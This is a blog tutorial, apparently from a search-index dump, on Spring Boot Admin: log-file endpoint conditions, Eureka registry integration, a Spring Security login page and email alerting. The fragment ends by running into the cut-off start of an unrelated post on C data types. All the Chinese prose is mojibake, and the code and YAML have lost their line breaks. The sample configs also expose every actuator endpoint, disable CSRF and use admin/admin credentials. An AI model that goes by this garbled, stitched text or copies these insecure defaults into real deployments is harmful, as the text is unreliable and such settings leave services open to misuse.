åˆ†æå…¶æ ¸å¿ƒåœ¨ LogFileWebEndpointAutoConfiguration è‡ªåŠ¨é…ç½®ç±»ä¸Šï¼Œæ‰€ä»¥ logging.file.nameã€logging.file.pathã€management.endpoint.logfile.external-file éƒ½å¯ä»¥ä½œä¸ºå¼€å¯æ¡ä»¶ã€‚ä½¿ç”¨ logging.file.path é…ç½®éœ€è¦æ³¨æ„ï¼Œå› ä¸ºé»˜è®¤ä¼šè¯»å– spring.log ä½œä¸ºæ—¥å¿—æ–‡ä»¶ï¼Œè€Œ logging.file.name åˆ™ä¸ä¼šã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445@Configuration( proxyBeanMethods = false)@ConditionalOnAvailableEndpoint( endpoint = LogFileWebEndpoint.class)@EnableConfigurationProperties({LogFileWebEndpointProperties.class})public class LogFileWebEndpointAutoConfiguration { public LogFileWebEndpointAutoConfiguration() { } @Bean @ConditionalOnMissingBean @Conditional({LogFileWebEndpointAutoConfiguration.LogFileCondition.class}) public LogFileWebEndpoint logFileWebEndpoint(ObjectProvider&lt;LogFile&gt; logFile, LogFileWebEndpointProperties properties) { return new LogFileWebEndpoint((LogFile)logFile.getIfAvailable(), properties.getExternalFile()); } private static class LogFileCondition extends SpringBootCondition { private LogFileCondition() { } public ConditionOutcome getMatchOutcome(ConditionContext context, AnnotatedTypeMetadata metadata) { Environment environment = context.getEnvironment(); String config = this.getLogFileConfig(environment, "logging.file.name", "logging.file"); Builder message = ConditionMessage.forCondition("Log File", new Object[0]); if (StringUtils.hasText(config)) { return ConditionOutcome.match(message.found("logging.file.name").items(new Object[]{config})); } else { config = this.getLogFileConfig(environment, "logging.file.path", "logging.path"); if (StringUtils.hasText(config)) { return ConditionOutcome.match(message.found("logging.file.path").items(new Object[]{config})); } else { config = environment.getProperty("management.endpoint.logfile.external-file"); return StringUtils.hasText(config) ? ConditionOutcome.match(message.found("management.endpoint.logfile.external-file").items(new Object[]{config})) : ConditionOutcome.noMatch(message.didNotFind("logging file").atAll()); } } } private String getLogFileConfig(Environment environment, String configName, String deprecatedConfigName) { String config = environment.resolvePlaceholders("${" + configName + ":}"); return StringUtils.hasText(config) ? config : environment.resolvePlaceholders("${" + deprecatedConfigName + ":}"); } }} å¦å¤–å¯ä»¥çœ‹åˆ° LogFileWebEndpointProperties è¿™ä¸ªç±»ï¼Œæ‰€ä»¥ management.endpoint.logfile.externalFile ä¹Ÿæ˜¯å¯ä»¥ä½œä¸ºå¼€å¯æ¡ä»¶ å®é™…ä¸Š Spring åœ¨è§£æ Properties æ—¶ä¼šåœ¨ Spring ç¼“å­˜çš„ Map ä¸­ï¼ŒæŠŠ management.endpoint.logfile.external-file çš„ Key è½¬æ¢æˆ management.endpoint.logfile.externalFile 4ã€Admin æ•´åˆ Eureka æ³¨å†Œä¸­å¿ƒåœ¨ä¸Šè¿°çš„å¿«é€Ÿå…¥é—¨æ¡ˆä¾‹é‡Œï¼Œæ˜¯ç›´æ¥å°† Admin Client æ³¨å†Œåˆ°äº† Admin Server ä¸­ï¼Œè€Œä¼ä¸šå¼€å‘ä¸­æ›´å¤šçš„æ˜¯å°†æœåŠ¡æ³¨å†Œåˆ°æ³¨å†Œä¸­å¿ƒï¼ˆEurekaã€Consulï¼‰ï¼Œä»¥ä¸‹çš„æ¡ˆä¾‹å°†æ¼”ç¤ºå¦‚ä½•æ•´åˆ Admin å’Œ Eurekaï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 4.1ã€ç‰ˆæœ¬è¯´æ˜åœ¨æœ¬æ–‡ä¸­ï¼Œä½¿ç”¨çš„ Spring Cloud ç‰ˆæœ¬æ˜¯ Hoxton.SR1ï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.2.2.RELEASEï¼Œç‰¹åˆ«å£°æ˜é™¤å¤–ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ 4.2ã€åˆ›å»º Maven çˆ¶çº§ Pom å·¥ç¨‹åœ¨çˆ¶å·¥ç¨‹é‡Œé¢é…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“ Maven é…ç½®å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.2.2.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- ç®¡ç†ä¾èµ– --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Hoxton.SR1&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--æ³¨æ„ï¼šè¿™é‡Œéœ€è¦æ·»åŠ ä»¥ä¸‹é…ç½®ï¼Œå¦åˆ™å¯èƒ½ä¼šæœ‰å„ç§ä¾èµ–é—®é¢˜ --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 4.3ã€åˆ›å»º Eureka Server å·¥ç¨‹åˆ›å»º Eureka Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»º Eureka Server çš„å¯åŠ¨ä¸»ç±»ï¼š 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} æ·»åŠ  Eureka Server éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ï¼š 1234567891011server: port: 9003eureka: instance: hostname: localhost #EurekaæœåŠ¡ç«¯çš„å®ä¾‹åç§° client: register-with-eureka: false #falseè¡¨ç¤ºä¸å‘æ³¨å†Œä¸­å¿ƒæ³¨å†Œè‡ªå·± fetch-registry: false #falseè¡¨ç¤ºè‡ªå·±å°±æ˜¯æ³¨å†Œä¸­å¿ƒï¼ŒèŒè´£å°±æ˜¯ç»´æŠ¤æœåŠ¡å®ä¾‹ï¼Œå¹¶ä¸éœ€è¦å»æ£€ç´¢æœåŠ¡ service-url: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4.4ã€åˆ›å»º Admin Server å·¥ç¨‹åˆ›å»º Admin Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 12345678910111213&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-starter-server&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; æ·»åŠ  Admin Server éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼Œå°† Admin Server æ³¨å†Œåˆ° Eureka æ³¨å†Œä¸­å¿ƒï¼Œå¹¶æš´éœ² Admin Server çš„ Actuator çš„æ‰€æœ‰ç«¯å£ï¼š 1234567891011121314151617181920212223242526server: port: 9001spring: application: name: admin-servereureka: client: registryFetchIntervalSeconds: 5 service-url: defaultZone: http://127.0.0.1:9003/eureka/ instance: leaseRenewalIntervalInSeconds: 10 health-check-url-path: /actuator/health instance-id: ${spring.application.name}-${server.port} #è‡ªå®šä¹‰æœåŠ¡åç§° prefer-ip-address: true #å°†IPæ³¨å†Œåˆ°Eureka Serverä¸Šï¼Œè‹¥ä¸é…ç½®é»˜è®¤ä½¿ç”¨æœºå™¨çš„ä¸»æœºåmanagement: endpoints: web: exposure: include: "*" endpoint: health: show-details: ALWAYS åˆ›å»º Admin Server çš„ä¸»å¯åŠ¨ç±»ï¼Œæ·»åŠ  @EnableAdminServer æ³¨è§£å¼€å¯ç›‘æ§åŠŸèƒ½ï¼Œæ·»åŠ  @EnableDiscoveryClient æ³¨è§£è®© Admin Server å¯ä»¥å‘ç°æ³¨å†Œåˆ° Eureka é‡Œçš„å…¶ä»–æœåŠ¡å®ä¾‹ï¼š 123456789@EnableAdminServer@EnableDiscoveryClient@SpringBootApplicationpublic class AdminServerApplication { public static void main(String[] args) { SpringApplication.run(AdminServerApplication.class, args); }} 4.5ã€åˆ›å»º Admin Client å·¥ç¨‹åˆ›å»º Admin Client çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 1234567891011121314151617&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;de.codecentric&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-admin-starter-client&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt; æ·»åŠ  Admin Client éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ï¼Œå°† Admin Client æ³¨å†Œåˆ° Eureka æ³¨å†Œä¸­å¿ƒï¼Œè€Œä¸æ˜¯ä½¿ç”¨ä¸Šè¿°å¿«é€Ÿå…¥é—¨æ¡ˆä¾‹é‡Œçš„ spring.boot.admin.client.url å°† Admin Client æ³¨å†Œåˆ° Admin Server ä¸­ï¼Œæœ€åæš´éœ² Admin Client çš„ Actuator çš„æ‰€æœ‰ç«¯å£ï¼š 1234567891011121314151617181920212223242526server: port: 9002spring: application: name: admin-clienteureka: client: registryFetchIntervalSeconds: 5 service-url: defaultZone: http://127.0.0.1:9003/eureka/ instance: leaseRenewalIntervalInSeconds: 10 health-check-url-path: /actuator/health instance-id: ${spring.application.name}-${server.port} #è‡ªå®šä¹‰æœåŠ¡åç§° prefer-ip-address: true #å°†IPæ³¨å†Œåˆ°Eureka Serverä¸Šï¼Œè‹¥ä¸é…ç½®é»˜è®¤ä½¿ç”¨æœºå™¨çš„ä¸»æœºåmanagement: endpoints: web: exposure: include: "*" endpoint: health: show-details: ALWAYS åˆ›å»º Admin Client çš„ä¸»å¯åŠ¨ç±»ï¼Œå¼•å…¥ @EnableDiscoveryClient æ³¨è§£ï¼š 12345678@EnableDiscoveryClient@SpringBootApplicationpublic class AdminClientApplication { public static void main(String[] args) { SpringApplication.run(AdminClientApplication.class, args); }} 4.6ã€æµ‹è¯•ç»“æœ 1ï¼‰ä¾æ¬¡å¯åŠ¨ eureka-serverã€admin-serverã€admin-client åº”ç”¨ç¨‹åº 2ï¼‰æµè§ˆå™¨è®¿é—® http://127.0.0.1:9001/ï¼Œæ‰“å¼€ Admin Server çš„ Web ç•Œé¢ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªæœåŠ¡ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰ï¼š 3ï¼‰ç‚¹å‡»å®ä¾‹ä¿¡æ¯é“¾æ¥è·³è½¬åˆ°è¯¦ç»†é¡µé¢ï¼Œå¯ä»¥æŸ¥çœ‹å®ä¾‹çš„è¯¦ç»†ç›‘æ§ä¿¡æ¯ï¼Œè¿™é‡Œä¸å†ç´¯è¿° 5ã€Admin æ•´åˆ Spring Securityç”Ÿäº§ç¯å¢ƒä¸­ç”±äºè€ƒè™‘åˆ°å®‰å…¨é—®é¢˜ï¼Œä¸€èˆ¬ä¸å…è®¸ç›´æ¥è®¿é—® Admin Server çš„ Web ç•Œé¢ï¼Œå»ºè®®æ•´åˆ Admin + Spring Securityï¼Œä¸º Admin Server æ–°å¢ç™»å½•ç•Œé¢ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ åœ¨ Admin Server å·¥ç¨‹çš„ pom.xml é…ç½®æ–‡ä»¶ä¸­å¼•å…¥ä»¥ä¸‹çš„ä¾èµ–ï¼š 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;&lt;/dependency&gt; åœ¨ Admin Server å·¥ç¨‹çš„ application.yml ä¸­é…ç½® Spring Security çš„ç”¨æˆ·åå’Œå¯†ç ï¼ŒåŒæ—¶åœ¨æœåŠ¡æ³¨å†Œæ—¶å¸¦ä¸Š metadata-map çš„ä¿¡æ¯ï¼š 123456789101112131415161718192021222324252627282930313233server: port: 9001spring: application: name: admin-server security: user: name: "admin" password: "admin"eureka: client: registryFetchIntervalSeconds: 5 service-url: defaultZone: http://127.0.0.1:9003/eureka/ instance: leaseRenewalIntervalInSeconds: 10 health-check-url-path: /actuator/health instance-id: ${spring.application.name}-${server.port} #è‡ªå®šä¹‰æœåŠ¡åç§° prefer-ip-address: true #å°†IPæ³¨å†Œåˆ°Eureka Serverä¸Šï¼Œè‹¥ä¸é…ç½®é»˜è®¤ä½¿ç”¨æœºå™¨çš„ä¸»æœºå metadata-map: #æŒ‡å®šSpring Securityçš„ç”¨æˆ·åå’Œå¯†ç  user.name: ${spring.security.user.name} user.password: ${spring.security.user.password}management: endpoints: web: exposure: include: "*" endpoint: health: show-details: ALWAYS åœ¨ Admin Server å·¥ç¨‹ä¸­åˆ›å»º Spring Security çš„é…ç½®ç±»ï¼š 12345678910111213141516171819202122232425@Configurationpublic class SecurityConfiguration extends WebSecurityConfigurerAdapter { private final String adminContextPath; public SecurityConfiguration(AdminServerProperties adminServerProperties) { this.adminContextPath = adminServerProperties.getContextPath(); } @Override protected void configure(HttpSecurity http) throws Exception { SavedRequestAwareAuthenticationSuccessHandler successHandler = new SavedRequestAwareAuthenticationSuccessHandler(); successHandler.setTargetUrlParameter("redirectTo"); http.authorizeRequests() .antMatchers(adminContextPath + "/assets/**").permitAll() .antMatchers(adminContextPath + "/login").permitAll() .anyRequest().authenticated() .and() .formLogin().loginPage(adminContextPath + "/login").successHandler(successHandler).and() .logout().logoutUrl(adminContextPath + "/logout").and() .httpBasic().and() .csrf().disable(); }} é‡å¯ Admin Server æœåŠ¡ï¼Œåœ¨æµè§ˆå™¨ä¸Šè®¿é—® http://127.0.0.1:9001/ åï¼Œé¡µé¢ä¼šè¢«é‡å®šå‘åˆ°ç™»å½•ç•Œé¢ï¼Œç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç åˆ†åˆ«ä¸ºä¸Šé¢é…ç½®çš„ admin å’Œ adminï¼Œç•Œé¢æ˜¾ç¤ºå¦‚ä¸‹ï¼š 6ã€Admin æ•´åˆé‚®ç®±æŠ¥è­¦Spring Boot Admin ä¸­å¯ä»¥é›†æˆé‚®ç®±æŠ¥è­¦åŠŸèƒ½ï¼Œæ¯”å¦‚æœåŠ¡ä¸å¥åº·äº†ã€ä¸‹çº¿äº†ï¼Œéƒ½å¯ä»¥ç»™æŒ‡å®šé‚®ç®±å‘é€é‚®ä»¶ã€‚é›†æˆçš„æ­¥éª¤éå¸¸ç®€å•ï¼Œé¦–å…ˆåœ¨ Admin Server ä¸­å¼•å…¥ä»¥ä¸‹ä¾èµ–ï¼š 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-mail&lt;/artifactId&gt;&lt;/dependency&gt; åœ¨ Admin Server çš„ application.yml é…ç½®æ–‡ä»¶ä¸­ï¼Œæ·»åŠ é‚®ä»¶ç›¸å…³çš„é…ç½®å†…å®¹ï¼Œå…¶ä¸­ username ä¸ notify.mail.from çš„å†…å®¹å¿…é¡»ä¸€è‡´ï¼š 123456789101112spring: mail: port: 25 host: smtp.qq.com username: 158747124@qq.com password: xxxxxxx boot: admin: notify: mail: to: 389723578@qq.com from: 158747124@qq.com ç”±äºå›½å†…è…¾è®¯äº‘ã€é˜¿é‡Œäº‘é»˜è®¤å°äº† 25 ç«¯å£ï¼Œè‹¥é¡¹ç›®æ˜¯éƒ¨ç½²åœ¨äº‘æœåŠ¡å™¨ï¼Œä½¿ç”¨ä¸Šè¿°çš„é…ç½®æ˜¯æ— æ³•æ­£å¸¸å‘é€é‚®ä»¶çš„ï¼Œéœ€è¦æ›´æ”¹ä¸ºä½¿ç”¨ 465 ç«¯å£ï¼Œå¹¶å¯ç”¨ SSL é‚®ä»¶åŠ å¯†ï¼Œæœ€åç³»ç»Ÿé˜²ç«å¢™åˆ«å¿˜äº†å¼€æ”¾ 465 ç«¯å£ï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425spring: mail: port: 465 protocol: smtp host: smtp.qq.com username: 158747124@qq.com password: xxxxxxx properties: mail: smtp: auth: true socketFactory: port: 465 class: javax.net.ssl.SSLSocketFactory ssl: enable: true starttls: enable: true required: true boot: admin: notify: mail: to: 389723578@qq.com from: 158747124@qq.com ä»¥ä¸Šé…ç½®ï¼Œå½“å·²æ³¨å†Œçš„æœåŠ¡çš„çŠ¶æ€ä» UP å˜ä¸º OFFLINE æˆ–å…¶ä»–çŠ¶æ€æ—¶ï¼ŒAdmin Server ä¼šè‡ªåŠ¨å°†å‘Šè­¦é‚®ä»¶å‘é€åˆ°å¯¹åº”çš„é‚®ç®±ï¼Œæ›´å¤šé‚®ç®±ç›¸å…³çš„é…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627spring.mail.host=smtp.qq.comspring.mail.username=xx@qq.comspring.mail.password=xxxxxxspring.mail.properties.mail.smtp.auth=truespring.mail.properties.mail.smtp.starttls.enable=truespring.mail.properties.mail.smtp.starttls.required=truespring.mail.properties.mail.smtp.ssl.enable=truespring.mail.properties.mail.smtp.socket.factory.class=javax.net.ssl.SSLSocketFactoryspring.mail.properties.mail.smtp.socket.factory.fallback=falsespring.mail.properties.mail.smtp.port=465spring.mail.properties.mail.transport.protocol=smtp#éœ€è¦å¿½ç•¥çš„çŠ¶æ€æ”¹å˜é€šçŸ¥ï¼Œé€—å·åˆ†éš”,ä¾‹å¦‚ä¸é€šçŸ¥ç¦»çº¿åˆ°ä¸Šçº¿çš„çŠ¶æ€ï¼Œåˆ™å¡«å†™ä¸ºOFFLINE:UP#spring.boot.admin.notify.mail.ignore-changes=#æ¥æ”¶é€šçŸ¥çš„é‚®ç®±åœ°å€ï¼Œé€—å·åˆ†éš”spring.boot.admin.notify.mail.to=yangzhilong@qq.com#éœ€è¦æŠ„é€çš„é‚®ç®±åœ°å€ï¼Œé€—å·åˆ†éš”#spring.boot.admin.notify.mail.cc=test1@qq.com#é‚®ä»¶å‘é€è€…,å¤§éƒ¨åˆ†æƒ…å†µä¸ç™»å½•åç›¸åŒspring.boot.admin.notify.mail.from=${spring.mail.username}#é‚®ä»¶ä¸»é¢˜ï¼Œé»˜è®¤æ˜¯ï¼š#{application.name} (#{application.id}) is #{to.status}spring.boot.admin.notify.mail.subject=${spring.profiles.active} profile\'s #{application.name} (#{application.id}) is #{to.status}#é‚®ä»¶å†…å®¹ï¼Œé»˜è®¤æ˜¯ï¼š#{application.name} (#{application.id})\\nstatus changed from #{from.status} to #{to.status}\\n\\n#{application.healthUrl}spring.boot.admin.notify.mail.text=${spring.profiles.active} profile\'s #{application.name} (#{application.id})\\nstatus changed from #{from.status} to #{to.status}#Comma-delimited list of status changes to be ignored. Format: "&lt;from-status&gt;:&lt;to-status&gt;". Wildcards allowed.é»˜è®¤å€¼ï¼š"UNKNOWN:UP"#spring.boot.admin.notify.mail.ignore-changes= 7ã€å‚è€ƒèµ„æ–™ Spring Boot ä½¿ç”¨ QQ é‚®ç®±å‘é‚®ä»¶ Spring Boot Admin åœ¨çº¿æ—¥å¿—é…ç½® Spring Boot Admin 2.1.0 å…¨æ”»ç•¥ SpringBootï¼ˆ2.1.1ï¼‰ç›‘æ§ç®¡ç†åŠæ€§èƒ½è°ƒä¼˜ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡"},{title:"C è¯­è¨€è¯­æ³•ä¹‹ä¸€æ•°æ®ç±»å‹ä¸è¿ç®—ç¬¦",url:"/posts/168c8788.html",text:'æ•°æ®ç±»å‹æ•°æ®ç±»å‹æ¦‚è§ˆ å¸¸é‡ä¸å˜é‡å¯¹äºåŸºæœ¬æ•°æ®ç±»å‹é‡ï¼ŒæŒ‰å…¶å–å€¼æ˜¯å¦å¯æ”¹å˜åˆåˆ†ä¸ºå¸¸é‡å’Œå˜é‡ä¸¤ç§ã€‚åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå…¶å€¼ä¸å‘ç”Ÿæ”¹å˜çš„é‡ç§°ä¸ºå¸¸é‡ï¼Œå…¶å€¼å¯å˜çš„é‡ç§°ä¸ºå˜é‡ã€‚å®ƒä»¬å¯ä¸æ•°æ®ç±»å‹ç»“åˆèµ·æ¥åˆ†ç±»ï¼Œä¾‹å¦‚å¯åˆ†ä¸ºæ•´å‹å¸¸é‡ã€æ•´å‹å˜é‡ã€æµ®ç‚¹å¸¸é‡ã€æµ®ç‚¹å˜é‡ã€å­—ç¬¦å¸¸é‡ã€å­—ç¬¦å˜é‡ã€æšä¸¾å¸¸é‡ã€æšä¸¾å˜é‡ã€‚åœ¨ç¨‹åºä¸­ï¼Œå¸¸é‡æ˜¯å¯ä»¥ä¸ç»è¯´æ˜è€Œç›´æ¥å¼•ç”¨çš„ï¼Œè€Œå˜é‡åˆ™å¿…é¡»å…ˆå®šä¹‰åä½¿ç”¨ã€‚ï¼ˆæ•´å‹é‡åŒ…æ‹¬æ•´å‹å¸¸é‡ã€æ•´å‹å˜é‡ï¼‰ ç¬¦å·å¸¸é‡åœ¨ C è¯­è¨€ä¸­ï¼Œå¯ä»¥ç”¨ä¸€ä¸ªæ ‡è¯†ç¬¦æ¥è¡¨ç¤ºä¸€ä¸ªå¸¸é‡ï¼Œç§°ä¹‹ä¸ºç¬¦å·å¸¸é‡ã€‚ç¬¦å·å¸¸é‡åœ¨ä½¿ç”¨ä¹‹å‰å¿…é¡»å…ˆå®šä¹‰ï¼Œå…¶ä¸€èˆ¬å®šä¹‰å½¢å¼ä¸ºï¼š#define æ ‡è¯†ç¬¦ å¸¸é‡ã€‚å…¶ä¸­ #define ä¹Ÿæ˜¯ä¸€æ¡é¢„å¤„ç†å‘½ä»¤ï¼ˆé¢„å¤„ç†å‘½ä»¤éƒ½ä»¥â€#â€ å¼€å¤´ï¼‰ï¼Œç§°ä¸ºå®å®šä¹‰å‘½ä»¤ï¼Œå…¶åŠŸèƒ½æ˜¯æŠŠè¯¥æ ‡è¯†ç¬¦å®šä¹‰ä¸ºå…¶åçš„å¸¸é‡å€¼ã€‚ä¸€ç»å®šä¹‰ï¼Œä»¥ååœ¨ç¨‹åºä¸­æ‰€æœ‰å‡ºç°è¯¥æ ‡è¯†ç¬¦çš„åœ°æ–¹å‡ä»£ä¹‹ä»¥è¯¥å¸¸é‡å€¼ã€‚ä¹ æƒ¯ä¸Šç¬¦å·å¸¸é‡çš„æ ‡è¯†ç¬¦ç”¨å¤§å†™å­—æ¯ï¼Œå˜é‡æ ‡è¯†ç¬¦ç”¨å°å†™å­—æ¯ï¼Œä»¥ç¤ºåŒºåˆ«ã€‚ æ•´å‹å¸¸é‡çš„è¡¨ç¤ºæ–¹æ³•æ•´å‹å¸¸é‡å°±æ˜¯æ•´å¸¸æ•°ï¼Œåœ¨ C è¯­è¨€ä¸­ï¼Œä½¿ç”¨çš„æ•´å¸¸æ•°æœ‰åè¿›åˆ¶ã€å…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶ä¸‰ç§ï¼š åè¿›åˆ¶æ•´å¸¸æ•°ï¼šåè¿›åˆ¶æ•´å¸¸æ•°æ²¡æœ‰å‰ç¼€ï¼Œå…¶æ•°ç ä¸º 0ï½9ï¼Œä»¥ä¸‹å„æ•°æ˜¯åˆæ³•çš„åè¿›åˆ¶æ•´å¸¸æ•°ï¼š237ã€-568ã€65535ã€1627 å…«è¿›åˆ¶æ•´å¸¸æ•°ï¼šå…«è¿›åˆ¶æ•´å¸¸æ•°å¿…é¡»ä»¥ 0 å¼€å¤´ï¼Œå³ä»¥ 0 ä½œä¸ºå…«è¿›åˆ¶æ•°çš„å‰ç¼€ï¼Œæ•°ç å–å€¼ä¸º 0ï½7ï¼Œå…«è¿›åˆ¶æ•°é€šå¸¸æ˜¯æ— ç¬¦å·æ•°ã€‚ ä»¥ä¸‹å„æ•°æ˜¯åˆæ³•çš„å…«è¿›åˆ¶æ•°ï¼š 015 (åè¿›åˆ¶ä¸º 13)ã€0101 (åè¿›åˆ¶ä¸º 65)ã€0177777 (åè¿›åˆ¶ä¸º 65535) åå…­è¿›åˆ¶æ•´å¸¸æ•°ï¼šåå…­è¿›åˆ¶æ•´å¸¸æ•°çš„å‰ç¼€ä¸º 0X æˆ– 0xï¼Œå…¶æ•°ç å–å€¼ä¸º 09ï¼ŒAF æˆ– a~fã€‚ ä»¥ä¸‹å„æ•°æ˜¯åˆæ³•çš„åå…­è¿›åˆ¶æ•´å¸¸æ•°ï¼š 0X2A (åè¿›åˆ¶ä¸º 42)ã€0XA0 (åè¿›åˆ¶ä¸º 160)ã€0XFFFF (åè¿›åˆ¶ä¸º 65535) æ•´å‹å¸¸æ•°çš„åç¼€ï¼šåœ¨ 16 ä½å­—é•¿çš„æœºå™¨ä¸Šï¼ŒåŸºæœ¬æ•´å‹çš„é•¿åº¦ä¹Ÿä¸º 16 ä½ï¼Œå› æ­¤è¡¨ç¤ºçš„æ•°çš„èŒƒå›´ä¹Ÿæ˜¯æœ‰é™å®šçš„ã€‚åè¿›åˆ¶æ— ç¬¦å·æ•´å¸¸æ•°çš„èŒƒå›´ä¸º 0ï½65535ï¼Œæœ‰ç¬¦å·æ•°ä¸º - 32768ï½+32767ã€‚å…«è¿›åˆ¶æ— ç¬¦å·æ•°çš„è¡¨ç¤ºèŒƒå›´ä¸º 0ï½0177777ã€‚åå…­è¿›åˆ¶æ— ç¬¦å·æ•°çš„è¡¨ç¤ºèŒƒå›´ä¸º 0X0ï½0XFFFF æˆ– 0x0ï½0xFFFFã€‚å¦‚æœä½¿ç”¨çš„æ•°è¶…è¿‡äº†ä¸Šè¿°èŒƒå›´ï¼Œå°±å¿…é¡»ç”¨é•¿æ•´å‹æ•°æ¥è¡¨ç¤ºï¼Œé•¿æ•´å‹æ•°æ˜¯ç”¨åç¼€ â€œLâ€ æˆ– â€œlâ€ æ¥è¡¨ç¤ºçš„ã€‚ æ•´å‹å˜é‡çš„åˆ†ç±»æ³¨æ„ï¼šæ•´å‹å˜é‡å å¤šå°‘ä¸ªå­—èŠ‚ï¼Œè¿™ä¸ªè·Ÿç³»ç»Ÿå’Œç¼–è¯‘å™¨çš„è§„å®šæœ‰å…³ï¼ åŸºæœ¬å‹ï¼šç±»å‹è¯´æ˜ç¬¦ä¸º intï¼Œåœ¨å†…å­˜ä¸­å  4 ä¸ªå­—èŠ‚ çŸ­æ•´å‹ï¼šç±»å‹è¯´æ˜ç¬¦ä¸º short int æˆ– shortï¼Œåœ¨å†…å­˜ä¸­å  2 ä¸ªå­—èŠ‚ é•¿æ•´å‹ï¼šç±»å‹è¯´æ˜ç¬¦ä¸º long int æˆ– longï¼Œåœ¨å†…å­˜ä¸­å  8 ä¸ªå­—èŠ‚ æ— ç¬¦å·å‹ï¼šç±»å‹è¯´æ˜ç¬¦ä¸º 